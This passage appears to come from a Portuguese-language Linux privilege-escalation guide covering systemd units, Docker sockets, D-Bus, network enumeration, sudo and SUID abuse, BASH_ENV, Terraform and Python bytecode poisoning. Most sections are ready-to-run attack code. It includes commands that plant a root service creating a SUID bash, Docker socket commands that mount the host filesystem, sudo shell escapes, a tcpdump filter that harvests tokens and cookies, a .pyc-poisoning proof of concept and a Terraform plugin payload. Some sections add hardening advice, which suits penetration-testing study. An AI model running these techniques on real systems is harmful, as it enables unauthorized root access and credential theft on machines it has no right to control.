Se você descobrir que pode **escrever** em alguma das pastas do caminho, talvez consiga **escalar privilégios**. Você precisa procurar caminhos relativos usados em arquivos de configuração de serviços, como:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Em seguida, crie um **executável** com o **mesmo nome do binário no caminho relativo** dentro da pasta PATH do systemd em que você pode escrever. Quando o serviço for solicitado a executar a ação vulnerável (**Start**, **Stop**, **Reload**), seu **backdoor será executado** (usuários sem privilégios geralmente não podem iniciar/parar serviços, mas verifique se você pode usar `sudo -l`).

**Saiba mais sobre serviços com `man systemd.service`.**

## **Timers**

**Timers** são arquivos de unidade do systemd com nomes terminados em `**.timer**` que controlam arquivos `**.service**` ou eventos. **Timers** podem ser usados como alternativa ao cron, pois têm suporte integrado a eventos de horário do calendário e a eventos de tempo monotônico, além de poderem ser executados de forma assíncrona.

Você pode enumerar todos os timers com:

```bash
systemctl list-timers --all
```

### Timers graváveis

Se você puder modificar um timer, poderá fazer com que ele execute algumas unidades existentes do systemd.unit (como um `.service` ou um `.target`)

```bash
Unit=backdoor.service
```

Na documentação, você pode ler o que é a Unit:

> A unidade a ser ativada quando este timer expirar. O argumento é o nome de uma unidade, cujo sufixo não é ".timer". Se não for especificado, este valor será o padrão de um serviço com o mesmo nome da unidade do timer, exceto pelo sufixo. (Veja acima.) Recomenda-se que o nome da unidade ativada e o nome da unidade do timer sejam idênticos, exceto pelo sufixo.

Portanto, para abusar dessa permissão, você precisaria:

- Encontrar alguma unidade do systemd (como um `.service`) que **esteja executando um binário gravável**
- Encontrar alguma unidade do systemd que **esteja executando um caminho relativo** e sobre o qual você tenha **privilégios de gravação no PATH do systemd** (para se passar por esse executável)

**Saiba mais sobre timers com `man systemd.timer`.**

### **Habilitando o Timer**

Para habilitar um timer, você precisa de privilégios de root e executar:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Observe que o **timer** é **ativado** criando um link simbólico para ele em `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) permitem a **comunicação entre processos** na mesma máquina ou em máquinas diferentes dentro de modelos cliente-servidor. Eles utilizam arquivos de descritor Unix padrão para a comunicação entre computadores e são configurados por meio de arquivos `.socket`.<sup>[[14]](#references)</sup>

Os sockets podem ser configurados usando arquivos `.socket`.

**Saiba mais sobre sockets com `man systemd.socket`.** Nesse arquivo, vários parâmetros interessantes podem ser configurados:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Essas opções são diferentes, mas uma descrição geral serve para **indicar onde o socket ficará escutando** (o caminho do arquivo de socket AF_UNIX, o IPv4/6 e/ou o número da porta a escutar etc.)
- `Accept`: Recebe um argumento booleano. Se for **true**, uma **instância do serviço é iniciada para cada conexão recebida**, e somente o socket da conexão é passado para ela. Se for **false**, os próprios sockets de escuta são **passados para a unidade de serviço iniciada**, e uma única unidade de serviço é iniciada para todas as conexões. Esse valor é ignorado para sockets datagram e FIFOs, nos quais uma única unidade de serviço processa incondicionalmente todo o tráfego recebido. **O padrão é false**. Por razões de desempenho, recomenda-se escrever novos daemons de forma que sejam compatíveis com `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Recebem uma ou mais linhas de comando, que são **executadas antes** ou **depois** que os **sockets**/FIFOs de escuta são **criados** e associados, respectivamente. O primeiro token da linha de comando deve ser um nome de arquivo absoluto, seguido pelos argumentos do processo.
- `ExecStopPre`, `ExecStopPost`: **Comandos** adicionais que são **executados antes** ou **depois** que os **sockets**/FIFOs de escuta são **fechados** e removidos, respectivamente.
- `Service`: Especifica o nome da unidade de **serviço a ativar** quando houver **tráfego recebido**. Essa configuração só é permitida para sockets com Accept=no. O padrão é o serviço com o mesmo nome do socket (com o sufixo substituído). Na maioria dos casos, não é necessário usar essa opção.

### Arquivos .socket graváveis

Se encontrar um arquivo `.socket` **gravável**, você pode **adicionar** no início da seção `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor`, e o backdoor será executado antes da criação do socket. Portanto, você **provavelmente precisará esperar até que a máquina seja reiniciada.**\
_Observe que o sistema precisa estar usando a configuração desse arquivo de socket; caso contrário, o backdoor não será executado_

### Socket activation + caminho de unidade gravável (criar serviço ausente)

Outra configuração incorreta de alto impacto é:

- uma unidade de socket com `Accept=no` e `Service=<name>.service`
- a unidade de serviço referenciada está ausente
- um atacante pode gravar em `/etc/systemd/system` (ou em outro caminho de busca de unidades)

Nesse caso, o atacante pode criar `<name>.service` e, em seguida, enviar tráfego ao socket para que o systemd carregue e execute o novo serviço como root.

Fluxo rápido:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Sockets com permissão de escrita

Se você **identificar algum socket com permissão de escrita** (_estamos falando de Unix Sockets, não dos arquivos de configuração `.socket`_), então **pode se comunicar** com esse socket e talvez explorar uma vulnerabilidade.

### Enumerar Unix Sockets

```bash
netstat -a -p --unix
```

### Conexão bruta

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Exemplo de exploração:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### Sockets HTTP

Observe que pode haver alguns **sockets escutando por solicitações HTTP** (_não estou falando de arquivos .socket, mas de arquivos que atuam como sockets unix_). Você pode verificar isso com:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Se o socket **responder com uma requisição HTTP**, você poderá **se comunicar** com ele e talvez **explorar alguma vulnerabilidade**.

### Socket Docker gravável

O socket Docker, geralmente encontrado em `/var/run/docker.sock`, é um arquivo crítico que deve ser protegido. Por padrão, ele pode ser gravado pelo usuário `root` e por membros do grupo `docker`. Ter acesso de escrita a esse socket pode levar ao escalonamento de privilégios. Veja como isso pode ser feito e métodos alternativos caso a Docker CLI não esteja disponível.

#### **Escalonamento de privilégios com a Docker CLI**

Se você tiver acesso de escrita ao socket Docker, poderá escalar privilégios usando os seguintes comandos:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Esses comandos permitem executar um container com acesso root ao sistema de arquivos do host.

#### **Usando a API do Docker diretamente**

Quando a CLI do Docker não estiver disponível, ainda é possível abusar do socket do Docker usando HTTP bruto sobre o socket Unix. O fluxo mais confiável é:

- criar um container auxiliar de longa duração com o diretório raiz do host montado via bind
- iniciá-lo
- criar uma instância `exec` dentro desse container auxiliar
- iniciar a instância `exec` e ler a saída pela API

**Listar imagens do Docker**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Criar e iniciar um contêiner auxiliar**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Crie uma instância exec**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Inicie a instância exec e leia a saída**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Este padrão costuma ser mais robusto do que tentar controlar `attach` manualmente com `socat` ou `nc -U`. Depois que você consegue criar um helper com `/:/host`, pode usar outras instâncias de `exec` para ler arquivos como `/host/root/...`, adicionar chaves SSH em `/host/root/.ssh` ou modificar arquivos de inicialização do host.

### Outros

Observe que, se você tiver permissões de escrita no socket do docker porque está **dentro do grupo `docker`**, há [**mais maneiras de escalar privilégios**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Se a [**API do docker estiver escutando em uma porta**, você também poderá comprometê-la](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Confira **mais maneiras de escapar de containers ou abusar de runtimes de containers para escalar privilégios** em:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Escalada de privilégios com Containerd (ctr)

Se você descobrir que pode usar o comando **`ctr`**, leia a página a seguir, pois **talvez seja possível abusar dele para escalar privilégios**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Escalada de privilégios com **RunC**

Se você descobrir que pode usar o comando **`runc`**, leia a página a seguir, pois **talvez seja possível abusar dele para escalar privilégios**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus é um sofisticado **sistema de comunicação entre processos (IPC)** que permite que aplicações interajam e compartilhem dados com eficiência. Projetado para sistemas Linux modernos, oferece uma estrutura robusta para diferentes formas de comunicação entre aplicações.<sup>[[16]](#references)</sup>

O sistema é versátil e oferece suporte a IPC básico, que facilita a troca de dados entre processos, de forma semelhante a **sockets de domínio UNIX aprimorados**. Além disso, ajuda a transmitir eventos ou sinais, promovendo uma integração perfeita entre os componentes do sistema. Por exemplo, um sinal de um daemon Bluetooth indicando uma chamada recebida pode fazer com que um reprodutor de música silencie o áudio, melhorando a experiência do usuário. D-Bus também oferece suporte a um sistema de objetos remotos, simplificando solicitações de serviço e chamadas de métodos entre aplicações e otimizando processos que tradicionalmente eram complexos.

D-Bus opera com um **modelo de permitir/negar**, gerenciando as permissões de mensagens (chamadas de método, emissões de sinais etc.) com base no efeito cumulativo das regras de política correspondentes. Essas políticas especificam as interações com o barramento e podem permitir a escalada de privilégios por meio da exploração dessas permissões.

A seguir, é apresentado um exemplo de política em `/etc/dbus-1/system.d/wpa_supplicant.conf`, que detalha as permissões do usuário root para possuir, enviar mensagens a e receber mensagens de `fi.w1.wpa_supplicant1`.

Políticas sem um usuário ou grupo especificado se aplicam universalmente, enquanto as políticas de contexto "default" se aplicam a todos os casos não abrangidos por outras políticas específicas.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Aprenda a enumerar e explorar uma comunicação D-Bus aqui:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Rede**

É sempre interessante enumerar a rede e descobrir a posição da máquina.

### Enumeração genérica

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Se uma entrada ativa em `/etc/inetd.conf` executar o GNU Inetutils `telnetd` como root, verifique a versão do binário configurado e o listener local, mesmo quando a porta estiver vinculada apenas ao loopback. O GNU Inetutils das versões 1.9.3 a 2.7 tinha um [bypass de autenticação do telnet](https://seclists.org/oss-sec/2026/q1/89) em que o `USER` fornecido pelo cliente chegava ao `login -f` (CVE-2026-24061). Um processo ou uma string de versão é um indicador; confirme o status do patch do fornecedor e o daemon em execução antes de considerá-lo vulnerável. O [guia de Telnet](../../../network-services-pentesting/pentesting-telnet.md) contém mais detalhes.

### Triagem rápida de filtragem de tráfego de saída

Se o host puder executar comandos, mas as conexões de retorno falharem, diferencie rapidamente a filtragem de DNS, transporte, proxy e rotas:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Portas abertas

Sempre verifique os serviços de rede em execução na máquina com os quais você não conseguiu interagir antes de obter acesso a ela:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Classifique os listeners pelo alvo do bind:

- `0.0.0.0` / `[::]`: expostos em todas as interfaces locais.
- `127.0.0.1` / `::1`: acessíveis apenas localmente (bons candidatos para tunnel/forward).
- IPs internos específicos (por exemplo, `10.x`, `172.16/12`, `192.168.x`, `fe80::`): geralmente acessíveis apenas a partir de segmentos internos.

### Fluxo de triagem de serviços acessíveis apenas localmente

Quando você compromete um host, os serviços vinculados a `127.0.0.1` muitas vezes se tornam acessíveis pela primeira vez a partir do seu shell. Um fluxo de trabalho local rápido é:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS como scanner de rede (modo apenas de rede)

Além das verificações locais de PE, o linPEAS pode funcionar como um scanner de rede dedicado. Ele usa os binários disponíveis em `$PATH` (normalmente `fping`, `ping`, `nc`, `ncat`) e não instala ferramentas.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Se você passar `-d`, `-p` ou `-i` sem `-t`, o linPEAS se comporta como um scanner de rede puro (ignorando o restante das verificações de escalonamento de privilégios).

### Sniffing

Verifique se você consegue capturar tráfego. Se conseguir, talvez possa obter algumas credenciais.

```
timeout 1 tcpdump
```

Verificações práticas rápidas:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) é especialmente valioso em post-exploitation porque muitos serviços disponíveis apenas internamente expõem tokens/cookies/credenciais por lá:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Capture agora, analise depois:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Usuários

### Enumeração genérica

Verifique **quem** você é, quais **privilégios** você tem, quais **usuários** existem nos sistemas, quais podem **fazer login** e quais têm **privilégios de root:**

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### UID alto

Algumas versões do Linux foram afetadas por um bug que permite que usuários com **UID > INT_MAX** escalem privilégios. Mais informações: [aqui](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [aqui](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) e [aqui](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Explore-o** usando: **`systemd-run -t /bin/bash`**

### Grupos

Verifique se você é **membro de algum grupo** que possa conceder privilégios de root:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Área de transferência

Verifique se há algo interessante na área de transferência (se possível)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Política de senhas

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Senhas conhecidas

Se você **souber alguma senha** do ambiente, **tente fazer login como cada usuário** usando essa senha.

### Su Brute

Se não se importar em gerar muito ruído e os binários `su` e `timeout` estiverem presentes no computador, você pode tentar fazer brute-force de usuários usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) com o parâmetro `-a` também tenta fazer brute-force de usuários.

## Abusos de PATH gravável

### $PATH

Se descobrir que pode **escrever dentro de alguma pasta do $PATH**, talvez consiga escalar privilégios **criando um backdoor dentro da pasta gravável** com o nome de algum comando que será executado por outro usuário (idealmente, root) e que **não seja carregado de uma pasta localizada antes da sua pasta gravável no $PATH**.

### SUDO e SUID

Você pode ter permissão para executar algum comando usando sudo, ou ele pode ter o bit suid. Verifique usando:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Alguns **comandos inesperados permitem ler e/ou gravar arquivos ou até executar um comando**.<sup>[[8]](#references)</sup> Por exemplo:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

A configuração do sudo pode permitir que um usuário execute algum comando com os privilégios de outro usuário sem saber a senha.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

Neste exemplo, o usuário `demo` pode executar `vim` como `root`; agora é trivial obter um shell adicionando uma chave SSH ao diretório do root ou chamando `sh`.

```
sudo vim -c '!sh'
```

### Comparação Bash sem aspas em um script sudo

No Bash, o lado direito de `[[ "$protected" == $candidate ]]` é um padrão. Se um script sudo com capacidade de root preencher `candidate` a partir de um arquivo controlado pelo chamador, um valor como `prefix*` poderá corresponder ao início de uma string protegida. Diferentes caminhos de sucesso e erro podem então expor um prefix oracle. Coloque o lado direito entre aspas (`[[ "$protected" == "$candidate" ]]`) quando a intenção for comparar valores literais. Verifique os argumentos sudo reais, a origem das entradas e o comportamento observável dos branches antes de considerar explorável uma comparação sem aspas. O [manual do GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) define esse comportamento de padrões.

### Arquivos de projeto do PrusaSlicer executados com sudo

Uma permissão sudo irrestrita para executar `prusaslicer` ou `prusa-slicer` com capacidade de root merece ser analisada se o chamador puder escolher o projeto `.3mf` a ser fatiado. Um projeto pode conter um script de pós-processamento executado quando o G-code é exportado; projetos preparados podem executar comandos no PrusaSlicer até a versão 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Confirme a regra sudo efetiva, a versão do binário e os patches do fornecedor, a origem do projeto e se o caminho de exportação relevante é executado antes de concluir que a fronteira de privilégio pode ser alcançada. Um argumento de projeto fixo ou uma política `NOEXEC` efetiva pode mudar o resultado. Encontrar o slicer instalado, por si só, não comprova um caminho de escalada de privilégios.

### SETENV

Essa diretiva permite que o usuário **defina uma variável de ambiente** ao executar algo:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Este exemplo, **baseado na máquina Admirer do HTB**, era **vulnerável** a **PYTHONPATH hijacking** para carregar uma biblioteca Python arbitrária enquanto executava o script como root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Poisoning de `__pycache__` / `.pyc` gravável em imports Python permitidos pelo sudo

Se um **script Python permitido pelo sudo** importar um módulo cujo diretório de pacote contém um **`__pycache__` gravável**, talvez você consiga substituir o `.pyc` em cache e executar código como o usuário privilegiado na próxima importação.<sup>[[30]](#references)</sup>

- Por que funciona:
  - O CPython armazena caches de bytecode em `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - O interpretador valida o **cabeçalho** (magic + metadados de timestamp/hash vinculados ao código-fonte) e, em seguida, executa o objeto de código marshaled armazenado depois desse cabeçalho.
  - Se você puder **excluir e recriar** o arquivo em cache porque o diretório é gravável, ainda será possível substituir um `.pyc` pertencente ao root, mas sem permissão de escrita.

- Caminho típico:
  - `sudo -l` mostra um script ou wrapper Python que você pode executar como root.
  - Esse script importa um módulo local de `/opt/app/`, `/usr/local/lib/...` etc.
  - O diretório `__pycache__` do módulo importado é gravável pelo seu usuário ou por todos.

Enumeração rápida:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Se você puder inspecionar o script privilegiado, identifique os módulos importados e o caminho do cache:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Fluxo de exploração:

1. Execute uma vez o script permitido via sudo para que o Python crie o arquivo de cache legítimo, caso ele ainda não exista.
2. Leia os primeiros 16 bytes do `.pyc` legítimo e reutilize-os no arquivo envenenado.
3. Compile um objeto de código com o payload, use `marshal.dumps(...)` nele, exclua o arquivo de cache original e recrie-o com o cabeçalho original seguido do bytecode malicioso.
4. Execute novamente o script permitido via sudo para que a importação execute seu payload como root.

Observações importantes:

- Reutilizar o cabeçalho original é essencial porque o Python verifica os metadados do cache em relação ao arquivo-fonte, e não se o corpo do bytecode realmente corresponde ao código-fonte.
- Isso é especialmente útil quando o arquivo-fonte pertence ao root e não pode ser gravado, mas o diretório `__pycache__` que o contém pode.
- `PYTHONDONTWRITEBYTECODE=1` e `python -B` impedem o Python de gravar novos arquivos `.pyc`; eles **não** impedem o carregamento de um cache válido já substituído por um atacante. O limite crítico é saber se um usuário com menos privilégios pode substituir um cache que a importação privilegiada aceitará. Antes de carregar o bytecode em cache, o Python verifica os metadados de data/hora e tamanho ou o hash. Consulte a [referência de importação do Python](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) e a [documentação da linha de comando](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Estrutura mínima de prova de conceito:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Hardening:

- Garanta que nenhum diretório no caminho de importação do Python com privilégios elevados possa ser gravado por usuários com poucos privilégios, incluindo `__pycache__`.
- Audite a propriedade e as permissões dos diretórios de cache, incluindo os arquivos `.pyc` existentes. Desativar a gravação de bytecode pode reduzir a criação de novos caches, mas não neutraliza um cache existente que possa ser substituído.
- Trate módulos Python locais graváveis e diretórios de cache graváveis da mesma forma que trataria scripts de shell ou bibliotecas compartilhadas graváveis executados como root.

### BASH_ENV preservado via sudo env_keep → shell root

Se o sudoers preserva `BASH_ENV` (por exemplo, `Defaults env_keep+="ENV BASH_ENV"`), você pode aproveitar o comportamento de inicialização do Bash não interativo para executar código arbitrário como root ao invocar um comando permitido.<sup>[[24]](#references)</sup>

- Por que funciona: Em shells não interativos, o Bash avalia `$BASH_ENV` e carrega esse arquivo antes de executar o script de destino. Muitas regras do sudo permitem executar um script ou um wrapper de shell. Se `BASH_ENV` for preservado pelo sudo, seu arquivo será carregado com privilégios de root.<sup>[[23]](#references)</sup>

- Requisitos:
  - Uma regra do sudo que você possa executar (qualquer alvo que invoque `/bin/bash` de forma não interativa ou qualquer script Bash).
  - `BASH_ENV` presente em `env_keep` (verifique com `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Hardening:
  - Remova `BASH_ENV` (e `ENV`) de `env_keep`; prefira `env_reset`.
  - Evite wrappers de shell para comandos permitidos pelo sudo; use binários mínimos.
  - Considere o registro de I/O do sudo e alertas quando variáveis de ambiente preservadas forem usadas.

### Terraform via sudo com `HOME` preservado (!env_reset)

Quando o sudo permite executar Terraform como um usuário com mais privilégios, `!env_reset` é uma pista para verificar quais variáveis de ambiente realmente sobrevivem a essa regra específica. Confirme o `HOME` efetivo ou o `TF_CLI_CONFIG_FILE` antes de considerar um `.terraformrc` ou `terraform.rc` gravável pelo chamador como a configuração ativa da CLI. Uma entrada `provider_installation.dev_overrides` só é relevante se o comando fixo do Terraform carregar esse provider e o chamador puder colocar o executável no diretório selecionado.<sup>[[25]](#references)</sup>

- Aponte o provider necessário para um diretório gravável e coloque um plugin malicioso com o nome do provider (por exemplo, `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

O Terraform falhará no handshake do plugin Go, mas executará o payload como root antes de encerrar, deixando um shell SUID para trás.

### Sobrescritas de TF_VAR + bypass da validação de symlink

As variáveis do Terraform podem ser fornecidas por meio de variáveis de ambiente `TF_VAR_<name>` se a regra específica do sudo as preservar. Uma **leitura** de symlink de origem também precisa de um provider que siga o link e copie o resultado protegido para um destino legível pelo usuário. Uma **gravação** em symlink de destino requer, separadamente, uma entrada de destino controlada pelo usuário e um provider privilegiado que a siga durante a gravação; um job agendado posteriormente é apenas uma possível consequência. Antes de testar qualquer uma das rotas, inspecione a concessão exata do sudo, os arquivos `.tf` relevantes, a configuração da CLI selecionada e a propriedade dos caminhos com comandos somente de leitura, como `sudo -l`, `stat` e `readlink`. Validações lexicais fracas, como `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, não resolvem symlinks:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

O Terraform resolve o link simbólico e copia o arquivo real `/root/root.txt` para um destino que o invasor pode ler. A mesma abordagem pode ser usada para **escrever** em caminhos privilegiados, criando previamente links simbólicos no destino (por exemplo, apontando o caminho de destino do provider para dentro de `/etc/cron.d/`).

### requiretty / !requiretty

